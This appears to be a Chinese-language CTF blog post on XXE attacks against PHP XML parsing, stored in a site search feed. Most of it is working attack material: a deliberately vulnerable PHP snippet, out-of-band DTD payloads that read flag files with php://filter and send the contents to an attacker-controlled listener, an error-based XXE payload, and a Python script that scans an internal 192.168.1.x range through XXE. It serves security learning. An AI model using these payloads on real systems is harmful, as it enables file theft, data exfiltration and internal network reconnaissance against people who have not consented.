        <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="常用payload分析"><a href="#常用payload分析" class="headerlink" title="常用payload分析"></a>常用payload分析</h2><p>好像大家都用这个测试代码</p><pre><code class="php">&lt;?phplibxml_disable_entity_loader(false);$xmlfile = file_get_contents(&quot;php://input&quot;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);var_dump($creds);</code></pre><p>使用XML发送数据：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY a SYSTEM &quot;http://localhost:8887/aaaaa&quot;&gt;]&gt;&lt;root&gt;&amp;a;&lt;/root&gt;</code></pre><p>但是我在尝试参数实体的时候似乎不能外带数据</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY % a &quot;http://localhost:8887/aaa&quot;&gt;%a;]&gt;&lt;root&gt;&lt;/root&gt;</code></pre><p><img src="/posts/2e545689/1580302730124.png" alt></p><p>嵌套也是不行的</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % file SYSTEM &quot;file:///flag.txt&quot;&gt;      &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost:8887/?%file;&#39;&gt;&quot;&gt;    %start;    %send;]&gt;</code></pre><p>最常用的外带数据的方法：</p><p>在自己的vps上准备两个文件，我这里就就都在本机做的实验</p><p>本地的8001端口开一个web服务，</p><p><img src="/posts/2e545689/1580302833010-1580342074917.png" alt></p><p><code>local.xml</code> 文件内容：</p><pre><code class="xml">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost:8887/?%file;&#39;&gt;&quot;&gt;%start;</code></pre><p>这个文件表示读取到数据之后发送给另一个8887端口，然后我们向受害者服务器发送数据，</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;http://localhost:8001/local.xml&quot;&gt;      &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.txt&quot;&gt;    %remote;    %send;]&gt;&lt;message&gt;1234&lt;/message&gt;</code></pre><p>然后就可以在8887端口接收到数据了</p><p><img src="/posts/2e545689/1580302962486-1580342120888.png" alt></p><p>换一种 <code>payload</code> 也行</p><p>DTD文件</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://localhost:8887/p=%file;&#39;&gt;&quot;&gt;</code></pre><p>发送的 paylod</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://localhost:8001/local.xml&quot;&gt;%remote;%int;%send;]&gt;</code></pre><h2 id="报错XXE"><a href="#报错XXE" class="headerlink" title="报错XXE"></a>报错XXE</h2><p>这个方法p牛其实早就说过了,通过三层嵌套的XML就可以达到报错</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ELEMENT message ANY&gt;    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY % para &#39;        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;para2;    &#39;&gt;    %para;]&gt;&lt;message&gt;10&lt;/message&gt;</code></pre><p><img src="/posts/2e545689/1580303152983-1580342131433.png" alt></p><h2 id="XXE探测内网"><a href="#XXE探测内网" class="headerlink" title="XXE探测内网"></a>XXE探测内网</h2><pre><code class="xml">import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;#    &lt;stuff&gt;user&lt;/stuff&gt;#&lt;/xml&gt;def build_xml(string):    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;    send_xml(xml)def send_xml(xml):    headers = {&#39;Content-Type&#39;: &#39;application/xml&#39;}    x = requests.post(&#39;http://127.0.0.1/xml.php&#39;, data=xml, headers=headers, timeout=5).text    coded_string = x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value    print coded_string#   print base64.b64decode(coded_string)for i in range(1, 255):    try:        i = str(i)        ip = &#39;192.168.1.&#39; + i        string = &#39;php://filter/convert.base64-encode/resource=http://&#39; + ip + &#39;/&#39;        print string        build_xml(string)    except:      print &quot;error&quot;continue</code></pre><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> xml </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
